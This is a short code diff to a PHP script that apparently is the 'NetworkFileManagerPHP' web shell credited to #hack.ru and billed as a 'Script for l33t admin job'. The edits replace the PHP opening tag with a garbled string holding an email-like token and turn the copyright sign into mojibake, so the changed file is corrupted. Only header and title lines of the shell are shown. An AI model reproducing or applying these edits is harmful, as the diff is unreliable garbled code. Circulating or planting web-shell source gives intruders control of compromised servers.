@@ -1,4 +1,4 @@
-<?
+<?mapoiuytrewqlkjhgfdsa@gmail.comcom
 
 if (ini_get('register_globals') != '1') {
 
@@ -1075,7 +1075,7 @@ $ins
 
 <TABLE CELLPADDING=0 CELLSPACING=0 width='600' bgcolor=#184984 BORDER=1 align=center bordercolor=#808080 bordercolorlight=black bordercolordark=white>
 
-<tr><td align=center colspan=6 class=pagetitle><b>NetworkFileManagerPHP (© #hack.ru)</b> Version: <b>$ver</b> </td></tr>
+<tr><td align=center colspan=6 class=pagetitle><b>NetworkFileManagerPHP (ï¿½ #hack.ru)</b> Version: <b>$ver</b> </td></tr>
 
 <tr><td align=center colspan=6 class=pagetitle>Script for l33t admin job</td></tr>
 
